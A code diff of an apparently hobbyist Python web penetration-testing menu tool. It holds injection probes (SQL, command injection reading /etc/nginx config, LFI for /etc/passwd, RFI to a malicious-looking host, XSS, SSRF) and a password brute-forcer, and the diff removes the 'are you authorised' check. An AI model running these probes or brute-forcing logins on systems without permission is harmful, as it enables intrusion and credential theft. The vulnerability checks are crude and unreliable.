@@ -12,15 +12,11 @@
 ######################################################################################################################################################################################################################
 
 
-import random
-import string
-from datetime import datetime
-import os
 import requests
 from bs4 import BeautifulSoup
-import threading
+import os
+import subprocess
 import matplotlib.pyplot as plt
-import validators  # For URL validation
 
     
 # Banner
@@ -54,220 +50,200 @@ def print_banner():
     """
     print(banner)
 
-# Function to log test results to a file
-def log_result(test_name, result, details=""):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"{timestamp} - {test_name}: {result}\nDetails: {details}\n"
-    
+
+# Log function to keep track of test results
+def log_result(test_type, result, message):
     with open("penetration_testing_report.txt", "a") as log_file:
-        log_file.write(log_entry)
+        log_file.write(f"{test_type}: {result} - {message}\n")
+    print(f"{test_type}: {result} - {message}")
 
-# Function to log test results to an HTML report
-def log_result_html(test_name, result, details=""):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    report_entry = f"""
-    <tr>
-        <td>{timestamp}</td>
-        <td>{test_name}</td>
-        <td>{result}</td>
-        <td>{details}</td>
-    </tr>
-    """
-    if not os.path.exists("penetration_testing_report.html"):
-        with open("penetration_testing_report.html", "w") as html_file:
-            html_file.write("""
-            <html>
-                <head><title>Penetration Testing Report</title></head>
-                <body>
-                    <h1>Penetration Testing Report</h1>
-                    <table border="1">
-                        <tr><th>Timestamp</th><th>Test</th><th>Result</th><th>Details</th></tr>
-            """)
-
-    with open("penetration_testing_report.html", "a") as html_file:
-        html_file.write(report_entry)
-
-# --- New Vulnerability Tests ---
-# Adaptive Payload Function
-def adapt_payload(test_name, server_info):
-    # Dynamically craft payload based on server details
-    if "nginx" in server_info:
-        return {"input": "; cat /etc/nginx/nginx.conf"}
-    elif "apache" in server_info:
-        return {"input": "; cat /etc/httpd/conf/httpd.conf"}
-    return {"input": "; ls"}  # Default payload
-
-# SSRF Test (Server-Side Request Forgery)
-def ssrf_test(url):
-    print(f"Testing for SSRF on: {url}")
-    payload = {"url": "http://127.0.0.1:80"}  # Targeting localhost
-    try:
-        response = requests.post(url, data=payload)
-        if "refused" not in response.text:
-            log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected on {url}. Response: {response.text}")
-        else:
-            log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected on {url}.")
-    except requests.exceptions.RequestException as e:
-        log_result("SSRF Test", "Error", f"Error during SSRF test on {url}: {str(e)}")
-
-# Command Injection Test
-def command_injection_test(url):
-    print(f"Testing for Command Injection on: {url}")
-    server_info = requests.head(url).headers.get("Server", "")
-    payload = adapt_payload("Command Injection", server_info)
-    try:
-        response = requests.post(url, data=payload)
-        if "bin" in response.text or "root" in response.text:
-            log_result("Command Injection Test", "Vulnerable", f"Command Injection vulnerability detected on {url}. Response: {response.text}")
-        else:
-            log_result("Command Injection Test", "Not Vulnerable", f"No Command Injection vulnerability detected on {url}.")
-    except requests.exceptions.RequestException as e:
-        log_result("Command Injection Test", "Error", f"Error during Command Injection test on {url}: {str(e)}")
-
-# LFI/RFI Test
-def lfi_rfi_test(url):
-    print(f"Testing for LFI/RFI on: {url}")
-    lfi_payload = {"file": "../../../../etc/passwd"}  # Common LFI payload
-    rfi_payload = {"file": "http://malicious-website.com/malicious.php"}  # Common RFI payload
-
-    # LFI Test
-    try:
-        lfi_response = requests.get(url, params=lfi_payload)
-        if "root:" in lfi_response.text:
-            log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected on {url}. Response: {lfi_response.text}")
-        else:
-            log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected on {url}.")
-    except requests.exceptions.RequestException as e:
-        log_result("LFI Test", "Error", f"Error during LFI test on {url}: {str(e)}")
-
-    # RFI Test
-    try:
-        rfi_response = requests.get(url, params=rfi_payload)
-        if "malicious" in rfi_response.text:
-            log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected on {url}. Response: {rfi_response.text}")
-        else:
-            log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected on {url}.")
-    except requests.exceptions.RequestException as e:
-        log_result("RFI Test", "Error", f"Error during RFI test on {url}: {str(e)}")
-
-# Automation: Crawl website and extract forms
-def crawl_website(url):
-    print(f"Crawling website: {url}")
+# Crawl Website and Discover Links and Forms
+def crawl_website(url, visited=None):
+    if visited is None:
+        visited = set()
+    if url in visited:
+        return
+    visited.add(url)
+    print(f"Crawling URL: {url}")
     try:
         response = requests.get(url)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        forms = soup.find_all('form')
-        for form in forms:
-            log_result("Form Found", "Info", str(form))
+        response.raise_for_status()
     except requests.exceptions.RequestException as e:
-        log_result("Crawl Website", "Error", f"Error crawling website {url}: {str(e)}")
+        log_result("Crawl", "Error", f"Error crawling {url}: {e}")
+        return
+    soup = BeautifulSoup(response.text, 'html.parser')
+    # Find all links
+    links = [a['href'] for a in soup.find_all('a', href=True)]
+    # Find all forms
+    forms = soup.find_all('form')
+    for form in forms:
+        log_result("Form Found", "Info", str(form))
+    for link in links:
+        if link.startswith('http'):
+            crawl_website(link, visited)
 
-# Parallel Execution
-def run_test_in_parallel(test_func, urls):
-    threads = []
-    for url in urls:
-        thread = threading.Thread(target=test_func, args=(url,))
-        threads.append(thread)
-        thread.start()
+# XSS Testing
+def xss_test(url):
+    payload = "<script>alert('XSS');</script>"
+    response = requests.post(url, data={"input_field": payload})
+    if payload in response.text:
+        log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected on {url}")
+    else:
+        log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected on {url}")
 
-    for thread in threads:
-        thread.join()
+# SQL Injection Testing
+def sql_injection_test(url):
+    payload = "' OR '1'='1"
+    response = requests.post(url, data={"input_field": payload})
+    if "error" in response.text.lower() or "mysql" in response.text.lower():
+        log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected on {url}")
+    else:
+        log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected on {url}")
 
-# Advanced Logging with Visualisation
+# SSRF Testing
+def ssrf_test(url):
+    payload = "http://localhost:8080"  # Trying to access internal resources
+    response = requests.get(url, params={"url": payload})
+    if "error" in response.text.lower():
+        log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected on {url}")
+    else:
+        log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected on {url}")
+
+# RFI Testing
+def rfi_test(url):
+    payload = "http://example.com/malicious_file"  # Remote file inclusion attempt
+    response = requests.get(url, params={"file": payload})
+    if "error" in response.text.lower():
+        log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected on {url}")
+    else:
+        log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected on {url}")
+
+# LFI Testing
+def lfi_test(url):
+    payload = "../../../../etc/passwd"  # Local file inclusion attempt
+    response = requests.get(url, params={"file": payload})
+    if "root" in response.text:
+        log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected on {url}")
+    else:
+        log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected on {url}")
+
+# Command Injection Testing
+def command_injection_test(url):
+    payload = "id; ls"  # Command injection attempt
+    response = requests.get(url, params={"cmd": payload})
+    if "uid" in response.text and "ls" in response.text:
+        log_result("Command Injection Test", "Vulnerable", f"Command injection detected on {url}")
+    else:
+        log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected on {url}")
+
+# Brute Force Testing for Login Forms
+def brute_force_test(url, username, wordlist):
+    with open(wordlist, 'r') as f:
+        for password in f.readlines():
+            password = password.strip()
+            response = requests.post(url, data={"username": username, "password": password})
+            if "login successful" in response.text:
+                log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}")
+                break
+
+# Session Handling for Login Automation
+def login(url, username, password):
+    session = requests.Session()
+    login_data = {"username": username, "password": password}
+    response = session.post(url, data=login_data)
+    if response.status_code == 200:
+        log_result("Login", "Success", f"Login successful with {username}/{password}")
+        return session
+    else:
+        log_result("Login", "Failure", f"Login failed with {username}/{password}")
+        return None
+
+# API Testing (e.g., POST or GET requests)
+def api_test(url, method="GET", data=None):
+    if method == "GET":
+        response = requests.get(url, params=data)
+    elif method == "POST":
+        response = requests.post(url, json=data)
+    if response.status_code != 200:
+        log_result("API Test", "Vulnerable", f"API issue found on {url}. Status: {response.status_code}")
+    else:
+        log_result("API Test", "Not Vulnerable", f"API test passed on {url}")
+
+# Generate a Summary Chart of Results
 def generate_report_chart():
-    labels = ['Vulnerable', 'Not Vulnerable']
-    counts = [0, 0]  # Replace with actual counts from logs
+    labels = ['Vulnerable', 'Not Vulnerable', 'Info']
+    counts = [0, 0, 0]  # Counts for each result type
 
-    # Count occurrences from the text log
     with open("penetration_testing_report.txt", "r") as log_file:
         logs = log_file.readlines()
         counts[0] = sum(1 for log in logs if "Vulnerable" in log)
         counts[1] = sum(1 for log in logs if "Not Vulnerable" in log)
+        counts[2] = sum(1 for log in logs if "Info" in log)
 
-    plt.bar(labels, counts, color=['red', 'green'])
+    plt.bar(labels, counts, color=['red', 'green', 'yellow'])
     plt.title("Vulnerability Test Results")
     plt.ylabel("Count")
     plt.savefig("vulnerability_report_chart.png")
+    plt.show()
 
-# Security Safeguards
-def validate_user_authorisation():
-    authorised = input("Are you authorised to test this system? (yes/no): ").strip().lower()
-    if authorised != "yes":
-        print("You are not authorised to perform these tests.")
+# Menu and Submenu system
+def display_menu():
+    print("\nPenetration Testing Menu:")
+    print("1. Crawl Website")
+    print("2. XSS Testing")
+    print("3. SQL Injection Testing")
+    print("4. SSRF Testing")
+    print("5. RFI Testing")
+    print("6. LFI Testing")
+    print("7. Command Injection Testing")
+    print("8. Brute Force Testing")
+    print("9. Session Handling (Login Automation)")
+    print("10. API Testing")
+    print("11. Generate Report")
+    print("12. Exit")
+
+def handle_menu_choice(choice):
+    target_url = input("Enter target URL: ")
+    username = input("Enter username for brute force/login (if applicable): ")
+    wordlist = input("Enter wordlist file path (if applicable): ")
+
+    if choice == 1:
+        crawl_website(target_url)
+    elif choice == 2:
+        xss_test(target_url)
+    elif choice == 3:
+        sql_injection_test(target_url)
+    elif choice == 4:
+        ssrf_test(target_url)
+    elif choice == 5:
+        rfi_test(target_url)
+    elif choice == 6:
+        lfi_test(target_url)
+    elif choice == 7:
+        command_injection_test(target_url)
+    elif choice == 8:
+        brute_force_test(target_url, username, wordlist)
+    elif choice == 9:
+        session = login(target_url, username, "password")
+        if session:
+            log_result("Session Handling", "Info", f"Logged in with {username}")
+    elif choice == 10:
+        api_test(target_url)
+    elif choice == 11:
+        generate_report_chart()
+    elif choice == 12:
+        print("Exiting...")
         exit()
 
-# URL Validation
-def is_valid_url(url):
-    if not validators.url(url):
-        print(f"Invalid URL: {url}")
-        return False
-    return True
-
-# --- Menu System ---
-def print_main_menu():
-    options = [
-        "[1] Crawl Website and Extract Forms", "[2] Brute Force Test (Optional)", 
-        "[3] RCE Test", "[4] LDAP Injection Test", "[5] Path Traversal Test", 
-        "[6] SQL Injection Test", "[7] SSRF Test", "[8] Command Injection Test", 
-        "[9] LFI/RFI Test", "[10] Exit"
-    ]
-    
-    # Display options in a column-like structure
-    print("=" * 30)
-    print("Advanced Web Penetration Testing Framework")
-    print("=" * 30)
-    for i in range(0, len(options), 2):
-        print(f"{options[i]:<40} {options[i+1] if i+1 < len(options) else ''}")
-    print("=" * 30)
-
-# Function to get user input for form selection
-def get_user_input():
-    try:
-        return int(input("Enter your choice (1 - 10): ").strip())
-    except ValueError:
-        print("Invalid choice. Please enter a number between 1 and 10.")
-        return None
-
-# Main Script
+# Main function to run the menu-driven program
 def main():
-    print_banner()
-    validate_user_authorisation()
-
     while True:
-        print_main_menu()
-        choice = get_user_input()
-
-        if choice == 1:
-            url = input("Enter the URL to crawl: ").strip()
-            if is_valid_url(url):
-                crawl_website(url)
-        elif choice == 2:
-            print("Brute Force Test option selected. Implement logic here.")
-        elif choice == 3:
-            print("RCE Test option selected. Implement logic here.")
-        elif choice == 4:
-            print("LDAP Injection Test option selected. Implement logic here.")
-        elif choice == 5:
-            print("Path Traversal Test option selected. Implement logic here.")
-        elif choice == 6:
-            print("SQL Injection Test option selected. Implement logic here.")
-        elif choice == 7:
-            url = input("Enter the URL to test for SSRF: ").strip()
-            if is_valid_url(url):
-                ssrf_test(url)
-        elif choice == 8:
-            url = input("Enter the URL to test for Command Injection: ").strip()
-            if is_valid_url(url):
-                command_injection_test(url)
-        elif choice == 9:
-            url = input("Enter the URL to test for LFI/RFI: ").strip()
-            if is_valid_url(url):
-                lfi_rfi_test(url)
-        elif choice == 10:
-            print("Exiting...")
-            break
-        else:
-            print("Invalid option. Please try again.")
+        display_menu()
+        try:
+            choice = int(input("Enter your choice: "))
+            handle_menu_choice(choice)
+        except ValueError:
+            print("Invalid input. Please enter a number between 1 and 12.")
 
 if __name__ == "__main__":
     main()
